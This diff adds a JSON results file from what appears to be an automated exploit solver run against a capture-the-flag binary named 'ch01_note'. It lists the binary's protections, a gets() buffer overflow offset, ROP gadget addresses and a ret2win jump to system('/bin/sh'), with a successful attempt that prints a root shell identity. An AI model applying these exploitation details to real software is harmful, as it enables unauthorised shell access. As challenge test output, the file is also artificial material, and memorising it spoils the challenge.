@@ -1,0 +1,54 @@
+{
+  "name": "ch01_note",
+  "ok": true,
+  "strategy": "ret2win",
+  "detail": "jump to system(\"/bin/sh\") @ 0x401186 off=23 align=1",
+  "elapsed": 1.5,
+  "attempt_count": 2,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Partial",
+      "static": false
+    },
+    "vulns": [
+      "gets@0x401162 disp=-15 off=23"
+    ],
+    "wins": [
+      "shell@0x401186(system(\"/bin/sh\"))"
+    ],
+    "binsh": "0x40201b",
+    "gadgets": {
+      "pop_rdi": "0x4011fb",
+      "pop_rbp": "0x401129",
+      "ret": "0x401016",
+      "leave": "0x401184"
+    },
+    "csu": true,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x401186 off=23 align=0",
+      "ok": false,
+      "elapsed": 0.32,
+      "tail": ""
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x401186 off=23 align=1",
+      "ok": true,
+      "elapsed": 0.89,
+      "tail": "PWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
